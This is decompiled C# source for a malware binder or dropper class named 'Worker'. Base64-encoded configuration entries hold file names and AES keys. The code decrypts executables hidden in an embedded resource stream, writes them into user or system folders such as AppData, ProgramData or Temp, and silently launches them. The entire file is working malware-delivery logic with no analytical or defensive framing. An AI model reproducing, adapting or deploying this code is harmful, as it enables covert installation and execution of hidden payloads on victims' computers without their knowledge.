﻿using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;

namespace Worker
{
	// Token: 0x02000002 RID: 2
	public class Worker
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public Worker(Type t)
		{
			this.Asm = t.Assembly;
			List<string> list = new List<string>();
			list.Add("CAAAAAFrAWICZGYBdAJzZgACZm4SUXVhbnR1bUJ1aWxkZXIuZXhlAWUBeQJlayxoaFdPQzNkampQVEFGWFNDakdidFo1TWhiSFlHSzdDaGswVTQyYnRubUVZPQJlaRhZV2tGaVVuT09zZzdxeHZQVk50MTNRPT0Dcl9rCnNxdWFyZS5kYXQ=");
			list.Add("CAAAAAFrAWICZGYCYWQCc2YAAmZuE2V4dmprYWtweXNhamd3aC5leGUBZQF5AmVrLDlLZWUxd0NVZ0U2bUpYMDA3eHZwUk02TnZiRDVMdFNpbythT1BZYlpzQjQ9AmVpGEZRbkRld3FTUHJNZE1KdmJrRnd5Vmc9PQNyX2sMYm94Z3JlZWQuZGF0");
			list.Add("CAAAAAFrAWICZGYCYWQCc2YAAmZuB21wci5leGUBZQF5AmVrLCt6K0UwUHBpbC9YNHB1aXEvSm00VWFIeDZUNjZSZ3Z4dmNJQ0Nub0hNalU9AmVpGFFaT0VYcjErdThoKzVjTkFtbWJCZlE9PQNyX2sOZGVhZGNlbnRlci5kYXQ=");
			List<Dictionary<string, string>> list2 = new List<Dictionary<string, string>>();
			foreach (string s in list)
			{
				list2.Add(this.Deserialize(s));
			}
			foreach (Dictionary<string, string> options in list2)
			{
				this.Execute(options);
			}
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002124 File Offset: 0x00000324
		private void Execute(Dictionary<string, string> options)
		{
			if (options["k"] == "b")
			{
				this.ExecuteBinder(options);
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002144 File Offset: 0x00000344
		private void ExecuteBinder(Dictionary<string, string> options)
		{
			string name = options["r_k"];
			byte[] array = this.ReadResources(name) as byte[];
			if (array == null)
			{
				return;
			}
			byte[] key = Convert.FromBase64String(options["ek"]);
			byte[] iv = Convert.FromBase64String(options["ei"]);
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				rijndaelManaged.Key = key;
				rijndaelManaged.IV = iv;
				using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor())
				{
					array = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
				}
			}
			string text = this.ConstructPath(options);
			if (File.Exists(text))
			{
				try
				{
					File.Delete(text);
				}
				catch
				{
					return;
				}
			}
			File.WriteAllBytes(text, array);
			if (options["e"] == "y")
			{
				Process.Start(text);
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002248 File Offset: 0x00000448
		private object ReadResources(string name)
		{
			string name2 = "unliving.resources";
			using (Stream manifestResourceStream = this.Asm.GetManifestResourceStream(name2))
			{
				using (ResourceReader resourceReader = new ResourceReader(manifestResourceStream))
				{
					IDictionaryEnumerator enumerator = resourceReader.GetEnumerator();
					while (enumerator.MoveNext())
					{
						if ((string)enumerator.Key == name)
						{
							return enumerator.Value;
						}
					}
				}
			}
			return null;
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000022D8 File Offset: 0x000004D8
		private string ConstructPath(Dictionary<string, string> options)
		{
			string text = options["df"];
			string a;
			if ((a = text) != null)
			{
				if (!(a == "ad"))
				{
					if (!(a == "pd"))
					{
						if (!(a == "t"))
						{
							if (a == "cd")
							{
								text = Environment.CurrentDirectory;
							}
						}
						else
						{
							text = Path.GetTempPath();
						}
					}
					else
					{
						text = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
					}
				}
				else
				{
					text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				}
			}
			string text2 = options["sf"];
			if (!string.IsNullOrEmpty(text2))
			{
				text = Path.Combine(text, text2);
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text).Refresh();
				}
			}
			string path = options["fn"];
			return Path.Combine(text, path);
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002394 File Offset: 0x00000594
		private Dictionary<string, string> Deserialize(string s)
		{
			byte[] buffer = Convert.FromBase64String(s);
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			using (MemoryStream memoryStream = new MemoryStream(buffer))
			{
				using (BinaryReader binaryReader = new BinaryReader(memoryStream, Encoding.UTF8))
				{
					for (int i = binaryReader.ReadInt32(); i > 0; i--)
					{
						string key = binaryReader.ReadString();
						string value = binaryReader.ReadString();
						dictionary.Add(key, value);
					}
				}
			}
			return dictionary;
		}

		// Token: 0x04000001 RID: 1
		private Assembly Asm;
	}
}
